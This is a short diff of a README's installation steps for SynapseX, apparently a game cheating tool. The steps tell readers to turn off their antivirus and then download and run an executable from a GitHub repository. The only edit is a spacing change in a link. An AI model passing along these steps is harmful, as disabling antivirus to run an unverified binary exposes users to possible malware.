@@ -13,7 +13,7 @@ We don’t permit users to deploy or discuss any methods of cheating, including:
 
 ## Installation
 1. Turn off Anti-Virus
-2. [Download][(https://github.com/githubskid/SynapseX)] Everything as zip
+2. [Download] [(https://github.com/githubskid/SynapseX)] Everything as zip
 3. Extract SynapseX.zip
 4. Open SynapseX.exe
 5. Enjoy!
